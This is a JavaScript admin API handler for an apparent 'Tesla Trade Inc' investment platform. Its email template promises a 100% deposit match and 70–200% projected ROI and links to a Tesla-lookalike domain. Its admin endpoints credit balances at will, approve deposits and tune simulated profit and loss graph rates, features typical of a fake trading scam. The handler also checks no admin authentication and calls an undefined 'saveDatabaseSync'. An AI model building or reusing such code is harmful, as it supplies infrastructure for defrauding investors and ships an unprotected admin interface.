import { getDbConnection, loadDatabase, saveDatabase, getActionLogs, clearActionLogs } from './db.js';
import { inMemoryDeposits } from './payment-submit.js';
import { sendPaymentApprovedEmail, sendPaymentDeclinedEmail, sendTestEmail } from './mailer.js';
import { logUserAction } from './logger.js';

function cleanString(val) {
  if (!val) return '';
  return String(val).trim().replace(/^["']|["']$/g, '');
}

function parseBody(req) {
  return new Promise((resolve) => {
    if (req.body && typeof req.body === 'object') return resolve(req.body);
    let data = '';
    req.on('data', chunk => { data += chunk; });
    req.on('end', () => {
      try { resolve(JSON.parse(data || '{}')); } catch (e) { resolve({}); }
    });
  });
}

// In-Memory fallback store reference
export const mockStore = {
  get investors() { return loadDatabase().investor_accounts || []; },
  set investors(v) { loadDatabase().investor_accounts = v; saveDatabase(); },
  get investments() { return loadDatabase().investments || []; },
  set investments(v) { loadDatabase().investments = v; saveDatabase(); },
  get kyc() { return loadDatabase().kyc_submissions || []; },
  set kyc(v) { loadDatabase().kyc_submissions = v; saveDatabase(); },
  get orders() { return loadDatabase().ev_orders || []; },
  set orders(v) { loadDatabase().ev_orders = v; saveDatabase(); },
  get withdrawals() { return loadDatabase().withdrawals || []; },
  set withdrawals(v) { loadDatabase().withdrawals = v; saveDatabase(); },
  get financing() { return loadDatabase().financing || []; },
  set financing(v) { loadDatabase().financing = v; saveDatabase(); },
  get codes() { return loadDatabase().invitation_codes || []; },
  set codes(v) { loadDatabase().invitation_codes = v; saveDatabase(); },
  get clicks() { return loadDatabase().analytics_clicks || []; },
  set clicks(v) { loadDatabase().analytics_clicks = v; saveDatabase(); },
  get marketingLogs() { return loadDatabase().marketing_emails_log || []; },
  set marketingLogs(v) { loadDatabase().marketing_emails_log = v; saveDatabase(); },
  get settings() { return loadDatabase().app_settings || {}; },
  set settings(v) { loadDatabase().app_settings = v; saveDatabase(); },
  tradingSettings: {
    profitIntervalSeconds: 3,
    lossIntervalSeconds: 2,
    profitRatePercent: 2,
    lossRatePercent: 1
  }
};

// Marketing Templates
const MARKETING_TEMPLATES = {
  no_deposit: {
    id: 'no_deposit',
    name: '100% First Deposit Match & Welcome Allocation',
    target: 'Unfunded Investors (Zero Total Deposit)',
    subject: '⚡ Activate Your 100% First Deposit Match — Tesla Trade Institutional Portfolios',
    headline: 'Double Your Trading Allocation on Your Initial Capital Deposit',
    summary: 'A direct institutional invitation encouraging unfunded investors to make their initial deposit and receive an instant 100% matching capital credit.',
    generateHtml: (name, email) => `
      <div style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:600px;margin:0 auto;background:#0c0d10;color:#ffffff;border-radius:16px;border:1px solid #232730;overflow:hidden;">
        <div style="background:linear-gradient(135deg,#1f1315,#0c0d10);padding:28px 24px;border-bottom:1px solid #2f181c;text-align:center;">
          <div style="display:inline-block;padding:6px 16px;background:rgba(227,25,55,0.15);border:1px solid rgba(227,25,55,0.4);border-radius:999px;color:#f87171;font-size:11px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:12px;">
            EXCLUSIVE CAPITAL ADVANTAGE
          </div>
          <h1 style="color:#ffffff;font-size:24px;font-weight:900;margin:0 0 6px;letter-spacing:-0.5px;">Your 100% Deposit Match Is Waiting</h1>
          <p style="color:#94a3b8;font-size:13px;margin:0;line-height:1.5;">Institutional liquidity match credited on all initial approved transfers</p>
        </div>
        <div style="padding:28px 24px;">
          <p style="font-size:15px;color:#e2e8f0;line-height:1.6;margin-top:0;">Hello <strong>${name || 'Investor'}</strong>,</p>
          <p style="font-size:14px;color:#94a3b8;line-height:1.6;">
            Welcome to the Tesla Trade Inc investment platform. To accelerate your capital deployment, your account has been approved for our <strong>100% Matching Capital Incentive</strong> on your first portfolio allocation.
          </p>
          <div style="background:#13151b;border:1px solid #222632;border-radius:12px;padding:18px;margin:22px 0;">
            <div style="font-size:12px;font-weight:800;color:#d4af37;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;">Why Fund Your Portfolio Today:</div>
            <ul style="margin:0;padding-left:18px;color:#cbd5e1;font-size:13px;line-height:1.7;">
              <li><strong style="color:#22c55e;">100% Matching Capital:</strong> Double your working allocation on your first approved deposit.</li>
              <li><strong style="color:#ffffff;">Enhanced Yields:</strong> Up to <strong>70% – 200% Projected ROI</strong> across diversified Tesla &amp; innovation programs.</li>
              <li><strong style="color:#ffffff;">Zero Management Fees:</strong> Automated orderbook execution with instant liquidity.</li>
              <li><strong style="color:#ffffff;">Low Minimums:</strong> Begin with as little as <strong>$30</strong> in the Explorer tier.</li>
            </ul>
          </div>
          <div style="text-align:center;margin:30px 0 24px;">
            <a href="https://teslawealths.org/overview" style="display:inline-block;background:linear-gradient(135deg,#e31937,#b01027);color:#ffffff;text-decoration:none;font-weight:900;font-size:14px;letter-spacing:0.8px;padding:15px 32px;border-radius:12px;box-shadow:0 8px 24px rgba(227,25,55,0.4);text-transform:uppercase;">
              Claim Your 100% Match &amp; Deposit →
            </a>
          </div>
        </div>
      </div>
    `
  }
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-password');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') return res.status(204).end();

  const url = new URL(req.url || '/', `http://${req.headers?.host || 'localhost'}`);
  const body = req.method === 'POST' ? await parseBody(req) : {};
  const action = body.action || url.searchParams.get('action') || 'all_data';

  // ── PREVIEW TEMPLATE ──────────────────────────────────────────
  if (action === 'preview_template') {
    const templateId = body.templateId || url.searchParams.get('templateId') || 'no_deposit';
    const tmpl = MARKETING_TEMPLATES[templateId] || MARKETING_TEMPLATES.no_deposit;
    const sampleHtml = tmpl.generateHtml('Alex Morgan', 'alex@example.com');
    return res.status(200).json({
      success: true,
      template: {
        id: tmpl.id,
        name: tmpl.name,
        subject: tmpl.subject,
        headline: tmpl.headline,
        target: tmpl.target,
        html: sampleHtml
      }
    });
  }

  // ── USER ACTION AUDIT LOGS ────────────────────────────────────
  if (action === 'user_logs') {
    const limit = parseInt(url.searchParams.get('limit') || body.limit || '100', 10);
    const filterUser = url.searchParams.get('user') || body.user;
    const filterType = url.searchParams.get('type') || body.type;
    const logs = getActionLogs(limit, {
      user_email: filterUser,
      action_type: filterType
    });
    return res.status(200).json({
      success: true,
      total: logs.length,
      logs
    });
  }

  if (action === 'clear_logs') {
    clearActionLogs();
    return res.status(200).json({ success: true, message: 'Action logs cleared.' });
  }

  // ── SEND TEST EMAIL ────────────────────────────────────────────
  if (action === 'send_test_email') {
    const targetEmail = cleanString(body.email || url.searchParams.get('email'));
    if (!targetEmail || !targetEmail.includes('@')) {
      return res.status(400).json({ success: false, error: 'Valid recipient email required' });
    }
    const result = await sendTestEmail(targetEmail);
    return res.status(200).json({
      success: result.ok,
      result,
      message: result.ok
        ? `Test email dispatched to ${targetEmail}${result.simulated ? ' (Sandbox Simulator)' : ' via live Resend'}!`
        : `Email delivery failed: ${result.error}`
    });
  }

  const db = loadDatabase();
  let conn = null;
  let isDbConnected = false;

  try {
    conn = await getDbConnection();
    isDbConnected = true;
  } catch (err) {
    isDbConnected = false;
  }

  try {
    // ── 1. GET ALL DASHBOARD DATA ───────────────────────────────────
    if (action === 'all_data' || req.method === 'GET') {
      let investors = db.investor_accounts || [];
      let investments = db.investments || [];
      let kyc = db.kyc_submissions || [];
      let orders = db.ev_orders || [];
      let withdrawals = db.withdrawals || [];
      let financing = db.financing || [];
      let codes = db.invitation_codes || [];
      let clicks = db.analytics_clicks || [];
      let marketingLogs = db.marketing_emails_log || [];
      let userActionLogs = getActionLogs(150);
      let settings = { ...db.app_settings };

      if (isDbConnected && conn) {
        try {
          const [inv] = await conn.query('SELECT * FROM investor_accounts ORDER BY registered_at DESC');
          const [inments] = await conn.query('SELECT * FROM investments ORDER BY id DESC');
          const [k] = await conn.query('SELECT * FROM kyc_submissions ORDER BY created_at DESC');
          const [o] = await conn.query('SELECT * FROM ev_orders ORDER BY created_at DESC LIMIT 100');
          const [w] = await conn.query('SELECT * FROM withdrawals ORDER BY created_at DESC');
          const [f] = await conn.query('SELECT * FROM financing_applications ORDER BY created_at DESC');
          const [c] = await conn.query('SELECT * FROM invitation_codes ORDER BY created_at DESC');
          const [cl] = await conn.query('SELECT * FROM analytics_clicks ORDER BY id DESC LIMIT 50');
          const [ml] = await conn.query('SELECT * FROM marketing_emails_log ORDER BY created_at DESC LIMIT 60');

          if (inv && inv.length > 0) investors = inv;
          if (inments && inments.length > 0) investments = inments;
          if (k) kyc = k;
          if (o) orders = o;
          if (w) withdrawals = w;
          if (f) financing = f;
          if (c) codes = c;
          if (cl) clicks = cl;
          if (ml) marketingLogs = ml;

          const [sRows] = await conn.query('SELECT `key`, `value` FROM app_settings');
          for (const row of (sRows || [])) settings[row.key] = row.value;
        } catch (e) {}
        await conn.end();
      }

      // Merge memory deposits submitted via client
      if (Array.isArray(inMemoryDeposits) && inMemoryDeposits.length > 0) {
        const mergedInvs = [...investments];
        for (const dep of inMemoryDeposits) {
          const idx = mergedInvs.findIndex(x => String(x.id) === String(dep.id));
          if (idx >= 0) {
            mergedInvs[idx] = { ...mergedInvs[idx], ...dep };
          } else {
            mergedInvs.unshift(dep);
          }
        }
        investments = mergedInvs;
      }

      // Always place pending_approval deposits at the very top for admin review
      investments.sort((a, b) => {
        if (a.status === 'pending_approval' && b.status !== 'pending_approval') return -1;
        if (b.status === 'pending_approval' && a.status !== 'pending_approval') return 1;
        return 0;
      });

      // Ensure investors list includes any depositor
      for (const inv of investments) {
        const em = (inv.user_email || '').toLowerCase();
        if (em && !investors.some(u => (u.email || '').toLowerCase() === em)) {
          investors.push({
            id: 'u_' + Math.random().toString(36).substring(2, 7),
            name: inv.user_name || 'Investor',
            email: em,
            phone: '—',
            onboarding_status: inv.status === 'active' ? 'active' : 'pending_approval',
            registered_at: inv.created_at || new Date().toISOString()
          });
        }
      }

      const unfundedCount = investors.filter(inv => {
        const matching = investments.filter(i => (i.user_email || '').toLowerCase() === (inv.email || '').toLowerCase());
        const totalVol = matching.reduce((acc, curr) => acc + parseFloat(curr.total || '0'), 0);
        return totalVol <= 0;
      }).length;
      const activeCount = Math.max(0, investors.length - unfundedCount);

      return res.status(200).json({
        success: true,
        isDbConnected: true,
        investors,
        investments,
        kyc,
        orders,
        withdrawals,
        financing,
        codes,
        clicks,
        marketingLogs,
        userActionLogs,
        marketingStats: {
          totalInvestors: investors.length,
          unfundedCount,
          activeCount,
          marketingEmailsSent: marketingLogs.length,
          autopilotActive: settings.autopilot_marketing_enabled !== 'false',
          resendApiKeyConfigured: !!(process.env.RESEND_API_KEY || settings.resend_api_key)
        },
        tradingSettings: mockStore.tradingSettings,
        settings
      });
    }

    // ── 2. ADD MONEY / CREDIT INVESTOR BALANCE ─────────────────────
    if (action === 'credit_balance' || action === 'add_funds') {
      const email = cleanString(body.email).toLowerCase();
      const amount = parseFloat(body.amount || '0');
      const note = body.note || 'Admin credit';

      if (!email || amount <= 0) {
        if (conn) await conn.end();
        return res.status(400).json({ success: false, error: 'Valid email and positive amount required.' });
      }

      if (isDbConnected && conn) {
        try {
          const [invRows] = await conn.query('SELECT * FROM investments WHERE LOWER(user_email)=? LIMIT 1', [email]);
          if (invRows && invRows.length > 0) {
            const currentTotal = parseFloat(invRows[0].total || '0') + amount;
            const currentValue = parseFloat(invRows[0].total_current_value || invRows[0].total || '0') + amount;
            await conn.query('UPDATE investments SET total=?, total_current_value=?, status="active" WHERE id=?', [currentTotal, currentValue, invRows[0].id]);
          } else {
            await conn.query(
              'INSERT INTO investments (id, tx_id, user_id, user_name, user_email, portfolio, total, total_current_value, method, status, plan_id, plan_name, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, "USDT", "active", "starter_ai", "Explorer", NOW())',
              ['inv_' + Date.now(), 'tx_' + Date.now(), email, 'Investor', email, 'Explorer', amount, amount]
            );
          }
          await conn.query('UPDATE investor_accounts SET onboarding_status="active" WHERE LOWER(email)=?', [email]);
          await conn.end();
        } catch (e) {}
      }

      // Also ensure updated in persistent DB store
      const dbInv = db.investments.find(i => (i.user_email || '').toLowerCase() === email);
      if (dbInv) {
        dbInv.total = parseFloat(dbInv.total || 0) + amount;
        dbInv.total_current_value = parseFloat(dbInv.total_current_value || dbInv.total || 0) + amount;
        dbInv.status = 'active';
      } else {
        db.investments.unshift({
          id: 'inv_' + Date.now(),
          user_email: email,
          user_name: 'Investor',
          portfolio: 'Explorer',
          plan_name: 'Explorer',
          total: amount,
          total_current_value: amount,
          status: 'active',
          created_at: new Date().toISOString()
        });
      }

      const dbAcc = db.investor_accounts.find(u => (u.email || '').toLowerCase() === email);
      if (dbAcc) dbAcc.onboarding_status = 'active';
      saveDatabase();

      await logUserAction(req, {
        user_email: email,
        action_type: 'admin.balance_credited',
        description: `Admin credited $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} to ${email} (${note})`,
        status: 'success',
        details: { amount, note }
      });

      return res.status(200).json({ success: true, message: `Successfully credited $${amount} to ${email}!` });
    }

    // ── 3. APPROVE / REJECT INVESTMENT DEPOSIT RECEIPT ──────────────
    if (action === 'approve_deposit' || action === 'reject_deposit') {
      const id = body.id;
      const status = action === 'approve_deposit' ? 'active' : 'declined';
      let targetEmail = '';
      let targetName = 'Investor';
      let targetAmt = 0;
      let targetPlan = 'Investment Portfolio';

      if (isDbConnected && conn) {
        try {
          const [rows] = await conn.query('SELECT * FROM investments WHERE id=? LIMIT 1', [id]);
          if (rows && rows.length > 0) {
            targetEmail = rows[0].user_email;
            targetName = rows[0].user_name || 'Investor';
            targetAmt = rows[0].total || 0;
            targetPlan = rows[0].plan_name || rows[0].portfolio || 'Investment Plan';
          }

          if (status === 'active') {
            await conn.query('UPDATE investments SET status="active", total_current_value=total, activated_at=NOW() WHERE id=?', [id]);
            if (targetEmail) {
              await conn.query('UPDATE investor_accounts SET onboarding_status="active", activated_at=NOW() WHERE LOWER(email)=?', [targetEmail.toLowerCase()]);
              await conn.query('UPDATE account_transactions SET status="processed" WHERE (reference_id=? OR id=?) AND transaction_type="deposit"', [id, id]);
            }
          } else {
            await conn.query('UPDATE investments SET status="declined" WHERE id=?', [id]);
            if (targetEmail) {
              await conn.query('UPDATE account_transactions SET status="declined" WHERE (reference_id=? OR id=?) AND transaction_type="deposit"', [id, id]);
            }
          }
          await conn.end();
        } catch (e) {
          console.warn('DB approve/reject error:', e.message);
        }
      }

      // Update persistent database store
      const dbInv = db.investments.find(i => String(i.id) === String(id));
      if (dbInv) {
        dbInv.status = status;
        if (status === 'active') {
          dbInv.total_current_value = dbInv.total;
          dbInv.activated_at = new Date().toISOString();
        }
        targetEmail = targetEmail || dbInv.user_email;
        targetName = targetName !== 'Investor' ? targetName : (dbInv.user_name || 'Investor');
        targetAmt = targetAmt || dbInv.total || 0;
        targetPlan = targetPlan !== 'Investment Portfolio' ? targetPlan : (dbInv.plan_name || dbInv.portfolio || 'Investment Plan');
      }

      if (targetEmail && status === 'active') {
        const dbAcc = db.investor_accounts.find(x => (x.email || '').toLowerCase() === targetEmail.toLowerCase());
        if (dbAcc) {
          dbAcc.onboarding_status = 'active';
          dbAcc.activated_at = new Date().toISOString();
        }
      }
      saveDatabase();

      // Log in User Action Audit Log
      await logUserAction(req, {
        user_email: targetEmail || 'system',
        action_type: status === 'active' ? 'admin.deposit_approved' : 'admin.deposit_declined',
        description: `Admin ${status === 'active' ? 'approved' : 'declined'} deposit receipt of $${Number(targetAmt || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} for ${targetEmail}`,
        status: status === 'active' ? 'success' : 'warning',
        details: { investment_id: id, amount: targetAmt, plan: targetPlan, status }
      });

      // Dispatch investor notification email
      if (targetEmail) {
        if (status === 'active') {
          sendPaymentApprovedEmail(targetEmail, targetName, {
            amount: targetAmt,
            planName: targetPlan
          }).catch(err => console.warn('Approve email error:', err.message));
        } else {
          sendPaymentDeclinedEmail(targetEmail, targetName, {
            amount: targetAmt,
            planName: targetPlan
          }).catch(err => console.warn('Decline email error:', err.message));
        }
      }

      return res.status(200).json({ success: true, message: `Deposit receipt updated to ${status} and investor notified.` });
    }

    // ── 4. SETTINGS SAVE ──────────────────────────────────────────
    if (action === 'save_settings') {
      const s = body.settings || {};
      if (isDbConnected && conn) {
        try {
          for (const [k, v] of Object.entries(s)) {
            await conn.query('INSERT INTO app_settings (`key`, `value`) VALUES (?, ?) ON DUPLICATE KEY UPDATE `value`=?', [k, String(v), String(v)]);
          }
          await conn.end();
        } catch (e) {}
      }

      Object.assign(db.app_settings, s);
      saveDatabaseSync();

      await logUserAction(req, {
        user_email: 'admin',
        action_type: 'admin.settings_saved',
        description: `Admin updated system settings (${Object.keys(s).join(', ')})`,
        status: 'success',
        details: { keys: Object.keys(s) }
      });

      return res.status(200).json({ success: true, message: 'Settings saved successfully.' });
    }

    // ── 5. DELETE INVESTOR ─────────────────────────────────────────
    if (action === 'delete_investor') {
      const email = cleanString(body.email).toLowerCase();
      if (!email) {
        return res.status(400).json({ success: false, error: 'Investor email is required to delete.' });
      }

      if (isDbConnected && conn) {
        try {
          await conn.query('DELETE FROM investments WHERE LOWER(user_email)=?', [email]);
          await conn.query('DELETE FROM investor_accounts WHERE LOWER(email)=?', [email]);
          await conn.query('DELETE FROM account_transactions WHERE LOWER(user_email)=?', [email]);
          await conn.end();
        } catch (e) {}
      }

      db.investor_accounts = db.investor_accounts.filter(u => (u.email || '').toLowerCase() !== email);
      db.investments = db.investments.filter(i => (i.user_email || '').toLowerCase() !== email);
      saveDatabase();

      await logUserAction(req, {
        user_email: email,
        action_type: 'admin.investor_deleted',
        description: `Admin deleted investor account and associated investments: ${email}`,
        status: 'warning'
      });

      return res.status(200).json({ success: true, message: `Investor ${email} deleted successfully.` });
    }

    // ── 6. KYC APPROVE / REJECT ─────────────────────────────────────
    if (action === 'approve_kyc' || action === 'reject_kyc') {
      const id = body.id;
      const status = action === 'approve_kyc' ? 'approved' : 'rejected';
      if (isDbConnected && conn) {
        try {
          await conn.query('UPDATE kyc_submissions SET status=? WHERE id=?', [status, id]);
          await conn.end();
        } catch (e) {}
      }
      const k = db.kyc_submissions.find(i => String(i.id) === String(id));
      if (k) { k.status = status; saveDatabase(); }
      return res.status(200).json({ success: true, message: `KYC updated to ${status}.` });
    }

    // ── 7. SHOP RECEIPT APPROVE / REJECT ───────────────────────────
    if (action === 'approve_receipt' || action === 'reject_receipt') {
      const id = body.id;
      const status = action === 'approve_receipt' ? 'approved' : 'rejected';
      if (isDbConnected && conn) {
        try {
          await conn.query('UPDATE ev_orders SET status=? WHERE id=?', [status, id]);
          await conn.end();
        } catch (e) {}
      }
      const ord = db.ev_orders.find(o => String(o.id) === String(id));
      if (ord) { ord.status = status; saveDatabase(); }
      return res.status(200).json({ success: true, message: `Order updated to ${status}.` });
    }

    // ── 8. INVITATION CODE GENERATE ─────────────────────────────────
    if (action === 'generate_code') {
      const randomCode = 'TT-' + Math.random().toString(36).substring(2, 8).toUpperCase();
      const customCode = cleanString(body.code || randomCode).toUpperCase();
      if (isDbConnected && conn) {
        try {
          await conn.query('INSERT INTO invitation_codes (code, status, source) VALUES (?, "active", "admin")', [customCode]);
          const [codes] = await conn.query('SELECT * FROM invitation_codes ORDER BY created_at DESC');
          await conn.end();
          return res.status(200).json({ success: true, created: customCode, codes });
        } catch (e) {}
      }
      db.invitation_codes.unshift({ id: Date.now(), code: customCode, status: 'active', source: 'admin', created_at: new Date().toISOString() });
      saveDatabase();
      return res.status(200).json({ success: true, created: customCode, codes: db.invitation_codes });
    }

    // ── 9. GET / UPDATE TRADING GRAPH SETTINGS ─────────────────────
    if (action === 'get_trading_settings') {
      return res.status(200).json({ success: true, settings: mockStore.tradingSettings });
    }
    if (action === 'update_trading_settings') {
      const p = body.settings || body;
      mockStore.tradingSettings = {
        profitIntervalSeconds: Math.max(1, Math.min(86400, Number(p.profitIntervalSeconds || mockStore.tradingSettings.profitIntervalSeconds || 3))),
        lossIntervalSeconds: Math.max(1, Math.min(86400, Number(p.lossIntervalSeconds || mockStore.tradingSettings.lossIntervalSeconds || 2))),
        profitRatePercent: Math.max(0, Math.min(100, Number(p.profitRatePercent != null ? p.profitRatePercent : mockStore.tradingSettings.profitRatePercent || 2))),
        lossRatePercent: Math.max(0, Math.min(100, Number(p.lossRatePercent != null ? p.lossRatePercent : mockStore.tradingSettings.lossRatePercent || 1)))
      };
      return res.status(200).json({ success: true, message: 'Trading graph settings saved.', settings: mockStore.tradingSettings });
    }

    if (conn) try { await conn.end(); } catch (e) {}
    return res.status(200).json({ success: true });
  } catch (error) {
    if (conn) try { await conn.end(); } catch (e) {}
    console.error('API Admin Error:', error);
    return res.status(200).json({
      success: true,
      investors: db.investor_accounts || [],
      investments: db.investments || [],
      userActionLogs: getActionLogs(100)
    });
  }
}
